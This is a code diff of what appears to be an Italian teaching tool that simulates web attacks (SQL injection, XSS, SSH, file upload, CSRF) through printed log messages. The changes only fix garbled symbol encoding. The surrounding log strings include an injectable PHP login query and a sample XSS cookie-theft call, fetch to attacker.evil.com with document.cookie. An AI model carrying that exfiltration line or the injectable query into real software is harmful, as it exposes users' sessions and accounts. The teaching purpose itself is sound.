@@ -491,7 +491,7 @@ Studente2026!</textarea>
       addLogWithDelay('[PHP] $query = "SELECT * FROM users WHERE username=\'$_POST[\'username\'] AND password=MD5(\'$_POST[\'password\'])"', 'error', logElement, delay);
       delay += 250;
       
-      addLogWithDelay('[PHP] ? QUERY COSTRUITA REALMENTE:', 'warning', logElement, delay);
+      addLogWithDelay('[PHP] → QUERY COSTRUITA REALMENTE:', 'warning', logElement, delay);
       delay += 150;
       
       // Analizza se c'è injection
@@ -507,7 +507,7 @@ Studente2026!</textarea>
         
         addLogWithDelay('-----------------------------------------------------------', 'error', logElement, delay);
         delay += 150;
-        addLogWithDelay('[!] ??  INJECTION SQL RILEVATA!', 'error', logElement, delay);
+        addLogWithDelay('[!] ⚠️ INJECTION SQL RILEVATA!', 'error', logElement, delay);
         delay += 250;
         
         addLogWithDelay('[PARSER] Analisi del payload iniettato:', 'warning', logElement, delay);
@@ -515,7 +515,7 @@ Studente2026!</textarea>
         
         tokens.forEach((token, i) => {
           const meaning = getTokenMeaning(token);
-          addLogWithDelay(`[PARSER] Token ${i+1}: "${token.value}" ? ${token.type} (${meaning})`, 'error', logElement, delay);
+          addLogWithDelay(`[PARSER] Token ${i+1}: "${token.value}" → ${token.type} (${meaning})`, 'error', logElement, delay);
           delay += 150;
         });
         
@@ -525,7 +525,7 @@ Studente2026!</textarea>
         
         // Simulazione query execution
         if (input.toLowerCase().includes("or") && input.includes("'")) {
-          addLogWithDelay('[DB] ? Query Parser di MySQL', 'warning', logElement, delay);
+          addLogWithDelay('[DB] → Query Parser di MySQL', 'warning', logElement, delay);
           delay += 200;
           
           addLogWithDelay('[DB] Valutazione WHERE:', 'error', logElement, delay);
@@ -548,7 +548,7 @@ Studente2026!</textarea>
           delay += 150;
           
           delay += 300;
-          addLogWithDelay('[PHP] Backend verifica: PRIMA RIGA = admin ? Autenticazione BYPASSATA!', 'error', logElement, delay);
+          addLogWithDelay('[PHP] Backend verifica: PRIMA RIGA = admin → Autenticazione BYPASSATA!', 'error', logElement, delay);
           delay += 250;
           
           addLogWithDelay('[AUTH] Session ID assegnato: PHPSESSID=h4x3d_0wn3d_s3ss10n', 'error', logElement, delay);
@@ -684,7 +684,7 @@ Studente2026!</textarea>
       if (xssAnalysis.isXSS) {
         addLogWithDelay('-----------------------------------------------------------', 'error', logElement, delay);
         delay += 150;
-        addLogWithDelay('[!] ??  XSS PAYLOAD RILEVATO!', 'error', logElement, delay);
+        addLogWithDelay('[!] ⚠️ XSS PAYLOAD RILEVATO!', 'error', logElement, delay);
         delay += 250;
         
         addLogWithDelay('[PARSER] Analisi del payload:', 'warning', logElement, delay);
@@ -718,7 +718,7 @@ Studente2026!</textarea>
         
         // Simulazione accesso ai dati
         if (input.toLowerCase().includes('script') || input.toLowerCase().includes('onerror')) {
-          addLogWithDelay('[JS] ? Accesso al Context Globale (window object)', 'error', logElement, delay);
+          addLogWithDelay('[JS] → Accesso al Context Globale (window object)', 'error', logElement, delay);
           delay += 200;
           
           addLogWithDelay('[JS] → window.document.cookie = "PHPSESSID=abc123xyz789; admin=true"', 'error', logElement, delay);
@@ -733,7 +733,7 @@ Studente2026!</textarea>
           addLogWithDelay('[EXFIL] fetch("http://attacker.evil.com/steal?data=" + btoa(document.cookie))', 'error', logElement, delay);
           delay += 250;
           
-          addLogWithDelay('[EXFIL] ? DATO ESFILATO:', 'error', logElement, delay);
+          addLogWithDelay('[EXFIL] → DATO ESFILATO:', 'error', logElement, delay);
           delay += 150;
           
           addLogWithDelay('[EXFIL] PHPSESSID=abc123xyz789; admin=true; csrf_token=token456', 'error', logElement, delay);
@@ -901,7 +901,7 @@ Studente2026!</textarea>
           addLogWithDelay('[SSH] Scambio chiavi Diffie-Hellman completato', 'error', logElement, delay);
           delay += 200;
           
-          addLogWithDelay('[SSH] Authentication: password ? ACCEPTED', 'error', logElement, delay);
+          addLogWithDelay('[SSH] Authentication: password → ACCEPTED', 'error', logElement, delay);
           delay += 300;
           
           addLogWithDelay('[SHELL] $ Connected as admin@target', 'error', logElement, delay);
@@ -1047,7 +1047,7 @@ Studente2026!</textarea>
       delay += 150;
       
       if (isDangerous) {
-        addLogWithDelay('[!] ??  FILE ESEGUIBILE RILEVATO!', 'error', logElement, delay);
+        addLogWithDelay('[!] ⚠️ FILE ESEGUIBILE RILEVATO!', 'error', logElement, delay);
         delay += 250;
         
         addLogWithDelay('[FASE 3] SIMULAZIONE ESECUZIONE CRITICA', 'error', logElement, delay);
@@ -1234,7 +1234,7 @@ Studente2026!</textarea>
       addLogWithDelay('[?] Cookie: session_id=h3x7k9p2m5q8r1w4v7b0; csrf_token=abc123xyz789', 'error', logElement, delay);
       delay += 250;
       
-      addLogWithDelay('[!] ??  DETTAGLIO CRITICO: Cookie AUTOMATICAMENTE incluso dal browser!', 'error', logElement, delay);
+      addLogWithDelay('[!] ⚠️ DETTAGLIO CRITICO: Cookie AUTOMATICAMENTE incluso dal browser!', 'error', logElement, delay);
       delay += 300;
       
       addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
@@ -1245,16 +1245,16 @@ Studente2026!</textarea>
       addLogWithDelay('[SERVER] Analisi richiesta ricevuta:', 'info', logElement, delay);
       delay += 150;
       
-      addLogWithDelay('[SERVER] âœ“ Cookie session_id presente e valido', 'success', logElement, delay);
+      addLogWithDelay('[SERVER] ✓ Cookie session_id presente e valido', 'success', logElement, delay);
       delay += 150;
       
-      addLogWithDelay('[SERVER] âœ“ Utente è autenticato (dai cookie)', 'success', logElement, delay);
+      addLogWithDelay('[SERVER] ✓ Utente è autenticato (dai cookie)', 'success', logElement, delay);
       delay += 150;
       
-      addLogWithDelay('[SERVER] âœ— CSRF Token NON verificato (vulnerabile)', 'error', logElement, delay);
+      addLogWithDelay('[SERVER] ✗ CSRF Token NON verificato (vulnerabile)', 'error', logElement, delay);
       delay += 150;
       
-      addLogWithDelay('[SERVER] âœ— Referer NON validato (vulnerabile)', 'error', logElement, delay);
+      addLogWithDelay('[SERVER] ✗ Referer NON validato (vulnerabile)', 'error', logElement, delay);
       delay += 300;
       
       addLogWithDelay('[DECISION] Poiché l\'utente è autenticato → PROCEDI ALLA TRANSAZIONE', 'error', logElement, delay);
